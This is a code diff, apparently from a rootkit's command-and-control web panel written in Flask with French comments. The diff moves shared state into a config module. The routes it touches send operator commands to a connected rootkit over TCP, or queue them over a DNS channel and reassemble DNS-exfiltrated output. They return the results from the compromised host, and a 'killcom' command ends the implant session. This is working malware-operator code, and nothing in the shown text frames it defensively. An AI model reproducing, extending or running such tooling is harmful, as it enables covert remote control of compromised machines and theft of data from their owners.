@@ -1,10 +1,17 @@
+from app import app
+import config as cfg
+from flask import render_template, redirect, url_for, request
+from pages.download import assemble_exfil
+import socket
+from utils.socket import send_to_server, receive_from_server
+
 # --------------------------------- TERMINAL --------------------------------- #
 
 @app.route('/terminal')
 def terminal():
-    if not authenticated:
+    if not cfg.authenticated:
         return redirect(url_for('login'))
-    return render_template("terminal.html", response=last_response, history=command_history, last_channel=last_channel)
+    return render_template("terminal.html", response=last_response, history=cfg.command_history, last_channel=last_channel)
 
 # ------------------------------- SEND COMMAND ------------------------------- #
 
@@ -12,7 +19,7 @@ def terminal():
 def send():
     global last_channel
     global last_response
-    if not authenticated:
+    if not cfg.authenticated:
         return redirect(url_for('login'))
 
     channel = request.form.get('channel','tcp')
@@ -23,10 +30,10 @@ def send():
 
     # Ajout de la commande dans l'historique
     command_entry = {"command": cmd, "stdout": "", "stderr": ""}
-    command_history.append(command_entry)
+    cfg.command_history.append(command_entry)
 
     if channel == 'dns':
-        command_queue.append(cmd)
+        cfg.command_queue.append(cmd)
         last_response = {"stdout": "", "stderr": "⏳ Queued via DNS"}
 
         out = assemble_exfil()
@@ -40,20 +47,20 @@ def send():
 
     else:
         try:
-            with connection_lock:
-                send_to_server(rootkit_connection, cmd)
+            with cfg.connection_lock:
+                send_to_server(cfg.rootkit_connection, cmd)
                 if 'killcom' in cmd.lower():
-                    rootkit_connection.close()
+                    cfg.rootkit_connection.close()
                     last_response = {"stdout": "", "stderr": "Connexion terminée."}
                     return redirect(url_for('dashboard'))
 
-                rootkit_connection.settimeout(3)
+                cfg.rootkit_connection.settimeout(3)
                 try:
                     chunks = []
-                    rootkit_connection.settimeout(1)
+                    cfg.rootkit_connection.settimeout(1)
                     while True:
                         try:
-                            part = receive_from_server(rootkit_connection)
+                            part = receive_from_server(cfg.rootkit_connection)
                             print(part)
                             if not part:
                                 break
@@ -89,7 +96,7 @@ def send():
                 except socket.timeout:
                     last_response = {"stdout": "", "stderr": "⏱️ Le rootkit n'a pas répondu à temps."}
                 finally:
-                    rootkit_connection.settimeout(None)
+                    cfg.rootkit_connection.settimeout(None)
 
         except Exception as e:
             last_response = {"stdout": "", "stderr": f"💥 Erreur : {e}"}
